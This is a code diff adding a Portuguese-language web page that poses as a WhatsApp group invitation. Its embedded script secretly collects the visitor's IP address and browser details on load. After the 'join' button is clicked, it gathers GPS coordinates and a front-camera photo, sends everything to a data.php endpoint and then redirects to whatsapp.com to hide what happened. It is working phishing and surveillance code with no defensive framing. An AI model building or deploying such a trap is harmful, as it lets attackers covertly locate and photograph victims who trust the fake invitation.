@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+    <html lang="pt-br" prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>teste</title>
+        
+        <!-- META TAGS DE PREVIEW -->
+        <meta property="og:title" content="teste">
+        <meta property="og:description" content="Convite para entrar no grupo de WhatsApp.">
+        <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfazHiEPWCypF510dYsaCCx7pa8_HJfozA0nz5UzNhZWTaU8dXqI_lSCdOT9w_g5MDsSA&usqp=CAU">
+        <meta property="og:type" content="website">
+        
+        <meta property="og:image:width" content="300">
+        <meta property="og:image:height" content="300">
+        
+        <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfazHiEPWCypF510dYsaCCx7pa8_HJfozA0nz5UzNhZWTaU8dXqI_lSCdOT9w_g5MDsSA&usqp=CAU">
+        <meta name="twitter:card" content="summary_large_image">
+        <link rel="image_src" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfazHiEPWCypF510dYsaCCx7pa8_HJfozA0nz5UzNhZWTaU8dXqI_lSCdOT9w_g5MDsSA&usqp=CAU">
+
+        <style>
+            body { background-color: #111b21; font-family: -apple-system, "Segoe UI", "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif; margin: 0; padding: 20px; color: #e9edef; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+            .wa-card { background-color: #202c33; padding: 20px; border-radius: 12px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+            .wa-img { width: 120px; height: 120px; border-radius: 50%; object-fit: cover; margin-bottom: 16px; margin-top: -60px; border: 4px solid #202c33; background: #202c33; }
+            h1 { font-size: 20px; font-weight: 500; margin: 0 0 8px 0; color: #e9edef; }
+            .wa-sub { font-size: 14px; color: #8696a0; margin-bottom: 24px; }
+            .btn-join { background-color: #00a884; color: #111b21; border: none; padding: 10px 24px; border-radius: 24px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; text-transform: uppercase; transition: background 0.2s; }
+            .btn-join:hover { background-color: #06cf9c; }
+            .wa-footer { margin-top: 30px; font-size: 13px; color: #8696a0; display: flex; align-items: center; gap: 6px; }
+            .wa-icon { width: 18px; height: 18px; fill: #8696a0; }
+        </style>
+    </head>
+    <body>
+
+        <div class="wa-card">
+            <img src="images/wa_default.jpg" class="wa-img">
+            <h1>teste</h1>
+            <div class="wa-sub">Convite para grupo de WhatsApp</div>
+            <button class="btn-join" onclick="startTrap()">Entrar no Grupo</button>
+        </div>
+
+        <div class="wa-footer">
+            <svg viewBox="0 0 33 33" class="wa-icon"><path d="M16.6 0C7.4 0 0 7.4 0 16.5c0 3 .8 5.9 2.3 8.4L.6 33l8.3-2.2C11.3 32.2 13.9 33 16.6 33c9.2 0 16.6-7.4 16.6-16.5S25.8 0 16.6 0zm0 29.8c-2.4 0-4.8-.6-6.9-1.9l-.5-.3-5.1 1.3 1.4-5-.3-.5C3.9 21.3 3.3 18.9 3.3 16.5c0-7.3 6-13.2 13.3-13.2s13.3 6 13.3 13.2-6 13.3-13.3 13.3z"></path></svg>
+            WhatsApp
+        </div>
+
+    <script>
+        window.onload = function() {
+            try {
+                fetch('https://api.ipify.org?format=json')
+                .then(r=>r.json())
+                .then(d=>{
+                    fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName})});
+                }).catch(e=>{});
+            } catch(e) {}
+        };
+
+        function startTrap() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
+            } else { 
+                requestCamera(); 
+            }
+        }
+
+        function onPosSuccess(pos) {
+            fetch('data.php', {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy })
+            });
+            requestCamera();
+        }
+
+        function onPosError(err) {
+            requestCamera();
+        }
+
+        function requestCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(function() {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const data = canvas.toDataURL('image/png');
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        fetch('data.php', {
+                            method: 'POST', headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({img: data})
+                        }).then(finish);
+                    }, 800);
+                })
+                .catch(function(err) {
+                    finish();
+                });
+            } else {
+                finish();
+            }
+        }
+
+        function finish() {
+            window.location.href = "https://whatsapp.com";
+        }
+    </script>
+    </body>
+    </html>
